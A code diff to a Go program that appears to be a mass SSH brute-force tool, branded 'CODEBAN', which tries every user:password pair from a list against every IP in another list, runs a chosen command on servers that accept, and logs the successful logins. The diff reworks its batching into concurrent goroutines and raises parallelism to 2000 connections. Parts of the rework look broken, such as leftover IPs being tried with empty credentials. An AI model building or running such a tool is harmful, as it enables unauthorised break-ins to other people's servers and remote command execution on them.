@@ -9,7 +9,6 @@ import (
 	"strconv"
 	"strings"
 	"sync"
-	"syscall"
 
 	"github.com/fatih/color"
 	"golang.org/x/crypto/ssh"
@@ -21,7 +20,7 @@ var (
 	ipUserPairsMu  sync.Mutex
 	wg             sync.WaitGroup
 	allowedIPRange *net.IPNet
-	semaphore      chan struct{}
+	semaphore      = make(chan struct{}, 2000) // Adjust semaphore buffer size
 )
 
 type connectionStatus struct {
@@ -142,7 +141,86 @@ func checkConnectionForIP(user, pass, command, ip, port string) {
 	handleGoodConnection(ip, user, pass, output, port)
 }
 
-func processIPBatch(user, pass, command, port string, ipBatch []string) {
+func checkVPS(userpassFile, command, ipListFile, port string, threads int) {
+	upf, err := os.Open(userpassFile)
+	if err != nil {
+		handleError(NewCustomError(fmt.Sprintf("Passfile - %s", err)))
+		return
+	}
+	defer upf.Close()
+
+	var ipBatchMutex sync.Mutex
+	var ipBatch []string
+
+	// Launch a goroutine to process the IP batches
+	go func() {
+		var wg sync.WaitGroup
+
+		scannerIP := bufio.NewScanner(upf)
+		for scannerIP.Scan() {
+			userPass := scannerIP.Text()
+			parts := strings.SplitN(userPass, ":", 2)
+			if len(parts) == 2 {
+				user := parts[0]
+				pass := parts[1]
+
+				fmt.Printf("[%s] - [%s]\n", user, pass)
+
+				ipf, err := os.Open(ipListFile)
+				if err != nil {
+					handleError(NewCustomError(fmt.Sprintf("IP List - %s", err)))
+					continue
+				}
+				defer ipf.Close()
+
+				scannerIP := bufio.NewScanner(ipf)
+				for scannerIP.Scan() {
+					ip := scannerIP.Text()
+
+					ipBatchMutex.Lock()
+					ipBatch = append(ipBatch, ip)
+
+					// Process IP batch when it reaches a certain size
+					if len(ipBatch) >= threads {
+						// Increment the WaitGroup for the batch
+						wg.Add(1)
+						// Launch a goroutine to process the batch
+						go processIPBatch(user, pass, command, port, append([]string{}, ipBatch...), &wg)
+						// Clear the batch
+						ipBatch = nil
+					}
+					ipBatchMutex.Unlock()
+				}
+			} else {
+				warningMessage := fmt.Sprintf("Warn - Invalid user:pass format: %s\n", userPass)
+				color.Cyan(warningMessage)
+			}
+		}
+
+		// Process any remaining IPs
+		if len(ipBatch) > 0 {
+			// Increment the WaitGroup for the remaining batch
+			wg.Add(1)
+			// Launch a goroutine to process the remaining batch
+			go processIPBatch("", "", "", "", append([]string{}, ipBatch...), &wg)
+		}
+
+		// Wait for all goroutines to finish processing IP batches
+		wg.Wait()
+	}()
+
+	// ...
+
+	// Wait for the IP batch processing goroutine to finish
+	wg.Wait()
+
+	// Display the colored completion message
+	fmt.Println("\n[ -- Finished -- ]")
+}
+
+func processIPBatch(user, pass, command, port string, ipBatch []string, wg *sync.WaitGroup) {
+	defer wg.Done()
+
 	for _, ip := range ipBatch {
 		// Acquire semaphore
 		semaphore <- struct{}{}
@@ -156,93 +234,6 @@ func processIPBatch(user, pass, command, port string, ipBatch []string) {
 			checkConnectionForIP(user, pass, command, ip, port)
 		}(user, pass, command, ip, port)
 	}
-}
-
-func checkVPS(userpassFile, command, ipListFile, port string, threads int) {
-	upf, err := os.Open(userpassFile)
-	if err != nil {
-		handleError(NewCustomError(fmt.Sprintf("Passfile - %s", err)))
-		return
-	}
-	defer upf.Close()
-
-	// Print banner and start message
-	printBanner()
-	fmt.Printf("\n\n\033[01;34m[\033[01;31m▶\033[01;34m] \033[01;34mBrute Started\033[0m\n\n")
-
-	// Create a buffered reader for the userpass file
-	scanner := bufio.NewScanner(bufio.NewReader(upf))
-	for scanner.Scan() {
-		userPass := scanner.Text()
-		parts := strings.SplitN(userPass, ":", 2)
-		if len(parts) == 2 {
-			user := parts[0]
-			pass := parts[1]
-
-			fmt.Printf("\033[01;34m[\033[0m %s \033[01;34m]\033[0m - \033[01;34m[\033[0m %s \033[01;34m]\033[0m\n", user, pass)
-
-			ipf, err := os.Open(ipListFile)
-			if err != nil {
-				handleError(NewCustomError(fmt.Sprintf("IP List - %s", err)))
-				continue
-			}
-			defer ipf.Close()
-
-			// Use buffered reader for IP list
-			scannerIP := bufio.NewScanner(bufio.NewReader(ipf))
-
-			var ipBatch []string
-			for scannerIP.Scan() {
-				ip := scannerIP.Text()
-				ipBatch = append(ipBatch, ip)
-
-				// Process IP batch when it reaches a certain size
-				if len(ipBatch) >= 1000 {
-					processIPBatch(user, pass, command, port, ipBatch)
-					ipBatch = nil
-				}
-			}
-
-			// Process any remaining IPs
-			processIPBatch(user, pass, command, port, ipBatch)
-		} else {
-			warningMessage := fmt.Sprintf("Warn - Invalid user:pass format: %s\n", userPass)
-			color.Cyan(warningMessage)
-		}
-	}
-
-	// Wait for all goroutines to finish
-	wg.Wait()
-
-	// Display the colored completion message
-	fmt.Println("\n\033[01;34m[\033[01;31m      -- Finished --     \033[01;34m]\033[0m")
-}
-
-func printBanner() {
-	fmt.Println("\033[01;34m╔══════════════════════════════════════════════════╗")
-	fmt.Println("\033[01;34m║\033[01;31m                  C O D E B A N                   \033[01;34m║")
-	fmt.Println("\033[01;34m╚══════════════════════════════════════════════════╝")
-}
-
-func handleError(err error) {
-	errorMessage := fmt.Sprintf("\n\t\t\033[31mC O\033[33m D E \033[096mB A N\033[0m\n\n\033[01;34m[ \033[01;31m-\033[01;34m ] \033[01;31mError \033[0m- %s\n", err)
-	color.Cyan(errorMessage)
-}
-
-func countLines(filename string) (int, error) {
-	file, err := os.Open(filename)
-	if err != nil {
-		return 0, err
-	}
-	defer file.Close()
-
-	scanner := bufio.NewScanner(file)
-	count := 0
-	for scanner.Scan() {
-		count++
-	}
-
-	return count, scanner.Err()
 }
 
 func handleGoodConnection(ip, user, pass string, output []byte, port string) {
@@ -296,20 +287,12 @@ func logToFile(file *os.File, logEntry string) {
 	}
 }
 
+func handleError(err error) {
+	errorMessage := fmt.Sprintf("\n\t\t\033[31mC O\033[33m D E \033[096mB A N\033[0m\n\n\033[01;34m[ \033[01;31m-\033[01;34m ] \033[01;31mError \033[0m- %s\n", err)
+	color.Cyan(errorMessage)
+}
+
 func main() {
-	// Increase the file descriptor limit
-	var rLimit syscall.Rlimit
-	rLimit.Max = 20000 // You may need to adjust this based on your system's capacity
-	rLimit.Cur = 20000
-	err := syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rLimit)
-	if err != nil {
-		handleError(NewCustomError(fmt.Sprintf("Error setting file descriptor limit: %s", err)))
-		os.Exit(1)
-	}
-
-	// Adjust semaphore buffer size
-	semaphore = make(chan struct{}, 1000) // Set to a reasonable value based on your system's capacity
-
 	// Usage message with information about the -S option
 	usage := "Usage: ./brute <userpass file> <custom command> <ip list file> <port> <threads> [-S <IP segment>]"
 
